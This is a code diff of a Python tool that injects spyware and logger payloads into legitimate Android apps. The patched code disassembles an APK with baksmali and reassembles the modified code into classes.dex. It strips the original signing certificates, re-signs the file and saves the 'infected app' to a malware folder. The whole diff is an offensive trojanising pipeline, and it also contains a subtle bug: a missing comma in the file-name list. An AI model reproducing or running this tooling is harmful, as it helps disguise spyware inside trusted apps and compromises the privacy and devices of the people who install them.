@@ -19,7 +19,7 @@ import re
 import shutil
 import subprocess
 import sys
-import zipfile
+import ruamel.std.zipfile as zipfile
 
 from payloads.logger import Logger
 from payloads.spyware import Spyware
@@ -165,7 +165,7 @@ def parse_args():
 
     return parser.parse_args()
 
-
+# TODO: Improve the returned output formatting - replace . with / and add .smali
 def get_main_activity(app):
     """
     Returns the main activity from the AndroidManifest.xml.
@@ -178,7 +178,7 @@ def get_main_activity(app):
         result = regex.search(output).group(0)
 
     except subprocess.CalledProcessError as ex:
-        logger.error("{} - {}".format(ex.returncode, ex.output))
+        logger.error("{} - {}".format(ex.returncode, ex.output.decode()))
         sys.exit(1)
 
     return result
@@ -192,10 +192,10 @@ def disassemble(app_absolute_path, app_name):
         instruction = (
             "java -jar ../libs/baksmali-2.2.1.jar disassemble "
             "--parameter-registers false -o {} {}".format(
-                os.path.abspath(os.path.join(config.TMP_FOLDER, app_name)),
-                os.path.abspath(app_absolute_path))
+                os.path.join(config.TMP_FOLDER, app_name),
+                app_absolute_path)
         )
-        subprocess.call(instruction, shell=True)
+        subprocess.check_output(instruction, shell=True)
 
         # Create a copy of the legitimate app disassembled code
         if config.DEBUG_MODE == 1:
@@ -206,75 +206,56 @@ def disassemble(app_absolute_path, app_name):
                       os.path.join(config.DEBUG_FOLDER, app_name))
 
     except subprocess.CalledProcessError as ex:
-        logger.error("{} - {}".format(ex.returncode, ex.output))
+        logger.error("{} - {}".format(ex.returncode, ex.output.decode()))
         sys.exit(1)
 
-
 def reassemble(payload):
-    # Create a copy of the infected app's source code
+    # Create a copy of the infected app source code
     if config.DEBUG_MODE == 1:
         util.copy(os.path.join(config.TMP_FOLDER, payload.app_name),
                   os.path.join(config.DEBUG_FOLDER, payload.app_name +
-                               "-malware"))
+                               "_malware"))
     try:
-        # Create the classes.dex
+        # Assemble the smali files into classes.dex
         instruction = (
             "java -jar ../libs/smali-2.2.1.jar assemble "
             "{} -o {}".format(
-                os.path.abspath(os.path.join(config.TMP_FOLDER,
-                                             payload.app_name)),
-                os.path.abspath(os.path.join(config.TMP_FOLDER,
-                                             "classes.dex")))
+                os.path.join(config.TMP_FOLDER, payload.app_name),
+                os.path.join(config.TMP_FOLDER, "classes.dex"))
         )
-        subprocess.call(instruction, shell=True)
+        subprocess.check_output(instruction, shell=True)
 
-        # Move classes.dex and AndroidManifest then clean-up
-        # Create an app-mod folder and erase its certificates
-        zipfile.ZipFile(payload.app_absolute_path).extractall(os.path.join(
-            config.TMP_FOLDER, payload.name))
-
-        for root, subdirs, files in os.walk(os.path.join(config.TMP_FOLDER,
-                                                         payload.app_name,
-                                                         "META-INF")):
-            for file in files:
-                file_path = os.path.join(config.TMP_FOLDER, payload.app_name,
-                                         "META-INF", file)
-                if (file != "MANIFEST.MF" and
-                   (".RSA" in file or ".SF" in file)):
-                    os.remove(os.path.abspath(file_path))
-
-        # Move the new classes.dex and AndroidManifest into the modified app
-        # folder
-        util.move(os.path.join(config.TMP_FOLDER, "classes.dex"),
-                  os.path.join(config.TMP_FOLDER, payload.app_name,
-                               "classes.dex"))
+        # Create a copy of the app - insert classes.dex, remove the cert and re-sign
+        util.copy(payload.app_absolute_path,
+                  os.path.join(config.TMP_FOLDER, payload.app_name + ".apk"))
 
         if (payload.name == "spyware"):
-            util.move(os.path.join(config.TMP_FOLDER, "AndroidManifest.xml"),
-                      os.path.join(config.TMP_FOLDER, payload.app_name,
-                                   "AndroidManifest.xml"))
+            file_names = [
+                "AndroidManifest.xml"
+                "classes.dex",
+                "META-INF/CERT.RSA",
+                "META-INF/CERT.SF"
+            ]
 
-        # Creation of the final .apk
-        # Create the app-mod.zip, rename it to app-mod.apk and remove
-        # the app-mod folder
-        shutil.make_archive(os.path.join(config.TMP_FOLDER, payload.app_name),
-                            "zip",
-                            os.path.join(config.TMP_FOLDER, payload.app_name))
+        else:
+            file_names = [
+                "classes.dex",
+                "META-INF/CERT.RSA",
+                "META-INF/CERT.SF"
+            ]
 
-        if not os.path.exists(config.MALWARE_FOLDER):
-            os.makedirs(config.MALWARE_FOLDER)
+        util.remove_from_zip(
+            os.path.join(config.TMP_FOLDER, payload.app_name + ".apk"), file_names)
 
-        util.move(
-            os.path.join(config.TMP_FOLDER, payload.app_name + ".zip"),
-            os.path.join(config.MALWARE_FOLDER, payload.app_name + ".apk"))
-        shutil.rmtree(config.TMP_FOLDER)
+        zin = zipfile.ZipFile(os.path.join(config.TMP_FOLDER, payload.app_name + ".apk"), 'a')
+        zin.write(os.path.join(config.TMP_FOLDER, "classes.dex"), "classes.dex")
 
     except subprocess.CalledProcessError as ex:
-        logger.error("{} - {}".format(ex.returncode, ex.output))
+        logger.error("{} - {}".format(ex.returncode, ex.output.decode()))
         sys.exit(1)
 
     except (zipfile.BadZipfile, zipfile.LargeZipFile) as ex:
-        logger.error("{} - {}".format(ex.returncode, ex.output))
+        logger.error("{}".format(ex))
         sys.exit(1)
 
 
@@ -284,14 +265,23 @@ def sign(payload):
         # make sure that the Java JDK is in the environement path
         instruction = (
             "jarsigner -verbose -sigalg SHA1withRSA "
-            "-digestalg SHA1 -keystore ../cert/my-release-key.keystore "
-            "-storepass password {} alias_name".format(os.path.join(
-                config.MALWARE_FOLDER, payload.app_name + ".apk"))
+            "-digestalg SHA1 -keystore {} "
+            "-storepass password {} alias_name".format(config.CERT, os.path.join(
+                config.TMP_FOLDER, payload.app_name + ".apk"))
         )
-        subprocess.call(instruction, shell=True, stdout=subprocess.DEVNULL)
+        subprocess.check_output(instruction, shell=True)
+
+        # Move the malware app to the MALWARE_FOLDER and remove the TMP_FOLDER
+        if not os.path.exists(config.MALWARE_FOLDER):
+            os.makedirs(config.MALWARE_FOLDER)
+
+        util.copy(
+            os.path.join(config.TMP_FOLDER, payload.app_name + ".apk"),
+            os.path.join(config.MALWARE_FOLDER, payload.app_name + ".apk"))
+        shutil.rmtree(config.TMP_FOLDER)
 
     except subprocess.CalledProcessError as ex:
-        logger.error("{} - {}".format(ex.returncode, ex.output))
+        logger.error("{} - {}".format(ex.returncode, ex.output.decode()))
         sys.exit(1)
 
 
